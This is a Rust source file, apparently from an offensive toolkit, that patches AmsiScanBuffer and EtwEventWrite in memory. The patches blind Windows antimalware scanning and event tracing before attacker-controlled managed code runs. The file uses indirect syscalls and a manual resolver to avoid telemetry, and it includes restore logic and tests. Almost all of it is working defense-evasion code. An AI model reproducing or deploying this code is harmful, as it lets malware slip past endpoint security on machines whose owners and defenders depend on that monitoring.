//! In-process AMSI and ETW patching (ABR-T024): before executing
//! attacker-controlled managed code, the two instrumentation layers a
//! default Windows 11 build offers in every process are neutralized for
//! THIS process only — no kernel object, no cross-process write.
//!
//! - `amsi.dll!AmsiScanBuffer` → `mov eax, 0x80070057 ; ret`
//!   (E_INVALIDARG: every scan reports "invalid argument" and succeeds).
//! - `ntdll!EtwEventWrite` → `xor eax, eax ; ret` (events swallow).
//!
//! Both patches flip the target page RW through the indirect-syscall
//! layer, write through volatile stores, read back byte-exact and
//! restore the original protection. Loading `amsi.dll` on demand is
//! itself telemetry-free (LoadLibraryA through the manual resolver,
//! no IAT entry).

use super::syscalls;
use std::sync::Mutex;

const PAGE_READWRITE: usize = 0x04;

/// Original prologue bytes saved by each patch so [`unpatch`] can
/// restore the modules bit-for-bit when the hardware-breakpoint variant
/// (ABR-T036) takes over.
/// Saved prologue: address, up to six original bytes, effective length.
type SavedPrologue = (usize, [u8; 6], usize);
static AMSI_ORIG: Mutex<Option<SavedPrologue>> = Mutex::new(None);
static ETW_ORIG: Mutex<Option<SavedPrologue>> = Mutex::new(None);

/// Patches `AmsiScanBuffer` and returns the patched address. Safe to
/// call repeatedly (idempotent once the stub is in place).
pub fn patch_amsi() -> Result<usize, String> {
    let addr = unsafe { super::syscalls::export_address("amsi.dll", "AmsiScanBuffer") }
        .ok_or("AmsiScanBuffer unresolved")?;
    // mov eax, 0x80070057 ; ret — scans return E_INVALIDARG.
    let stub = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
    let saved = save_original(addr, stub.len());
    patch_bytes(addr, &stub, "amsi")?;
    if let Ok(mut slot) = AMSI_ORIG.lock() {
        if let Some((bytes, len)) = saved {
            *slot = Some((addr, bytes, len));
        }
    }
    Ok(addr)
}

/// Patches `EtwEventWrite` and returns the patched address.
pub fn patch_etw() -> Result<usize, String> {
    let addr = unsafe { super::syscalls::export_address("ntdll.dll", "EtwEventWrite") }
        .ok_or("EtwEventWrite unresolved")?;
    // xor eax, eax ; ret — every event write reports success and drops.
    let stub = [0x31, 0xC0, 0xC3];
    let saved = save_original(addr, stub.len());
    patch_bytes(addr, &stub, "etw")?;
    if let Ok(mut slot) = ETW_ORIG.lock() {
        if let Some((bytes, len)) = saved {
            *slot = Some((addr, bytes, len));
        }
    }
    Ok(addr)
}

/// Restores the original prologue bytes of both patches (no-op when
/// nothing was patched). Called when the hardware-breakpoint suppression
/// arms successfully AFTER the pre-start patch — the CLR tolerates the
/// patch before its own start but breaks when it lands mid-initialized
/// (System.ArithmeticException inside the managed EventProvider), so the
/// byte patch is the pre-start shield and the breakpoints take over for
/// the process lifetime.
pub fn unpatch() -> Result<(), String> {
    for slot in [&AMSI_ORIG, &ETW_ORIG] {
        let saved = slot.lock().ok().and_then(|mut guard| guard.take());
        let Some((addr, bytes, len)) = saved else {
            continue;
        };
        restore_bytes(addr, &bytes[..len])?;
    }
    Ok(())
}

fn save_original(addr: usize, stub_len: usize) -> Option<([u8; 6], usize)> {
    // Read the current bytes only when they differ from our stub: on a
    // re-patch the originals were already captured on the first pass.
    let mut original = [0u8; 6];
    for (i, slot) in original.iter_mut().enumerate().take(stub_len) {
        *slot = unsafe { std::ptr::read_volatile((addr + i) as *const u8) };
    }
    // Skip capture on a re-patch: the stubs are already in place, which
    // means the originals were captured (and stored) on the first pass.
    let stub_amsi = [0xB8u8, 0x57, 0x00, 0x07, 0x80, 0xC3];
    let stub_etw = [0x31u8, 0xC0, 0xC3];
    let already = if stub_len == 6 {
        original[..6] == stub_amsi
    } else {
        original[..3] == stub_etw
    };
    (!already).then_some((original, stub_len))
}

fn restore_bytes(addr: usize, bytes: &[u8]) -> Result<(), String> {
    let original = unsafe { syscalls::protect(addr, bytes.len(), PAGE_READWRITE) }
        .ok_or("restore: RW protect failed")?;
    for (i, byte) in bytes.iter().enumerate() {
        unsafe { std::ptr::write_volatile((addr + i) as *mut u8, *byte) };
    }
    unsafe { syscalls::protect(addr, bytes.len(), original as usize) };
    Ok(())
}

fn patch_bytes(addr: usize, stub: &[u8], name: &str) -> Result<(), String> {
    let original = unsafe { syscalls::protect(addr, stub.len(), PAGE_READWRITE) }
        .ok_or_else(|| format!("{name}: RW protect failed"))?;
    for (i, byte) in stub.iter().enumerate() {
        unsafe { std::ptr::write_volatile((addr + i) as *mut u8, *byte) };
    }
    let ok = stub
        .iter()
        .enumerate()
        .all(|(i, byte)| (unsafe { std::ptr::read_volatile((addr + i) as *const u8) }) == *byte);
    // Restore the page's original protection (RX inside the module).
    unsafe { syscalls::protect(addr, stub.len(), original as usize) };
    if !ok {
        return Err(format!("{name}: readback mismatch"));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[ignore = "rewires global process instrumentation; run with --test-threads=1"]
    fn amsi_patch_lands_and_is_idempotent() {
        let addr = patch_amsi().expect("amsi patch");
        assert_ne!(addr, 0);
        // Second application must succeed on the already-patched stub.
        patch_amsi().expect("amsi patch idempotent");
        let bytes: [u8; 6] = unsafe { std::ptr::read_volatile(addr as *const [u8; 6]) };
        assert_eq!(bytes, [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]);
    }

    #[test]
    #[ignore = "rewires global process instrumentation; run with --test-threads=1"]
    fn etw_patch_lands() {
        let addr = patch_etw().expect("etw patch");
        let bytes: [u8; 3] = unsafe { std::ptr::read_volatile(addr as *const [u8; 3]) };
        assert_eq!(bytes, [0x31, 0xC0, 0xC3]);
    }
}
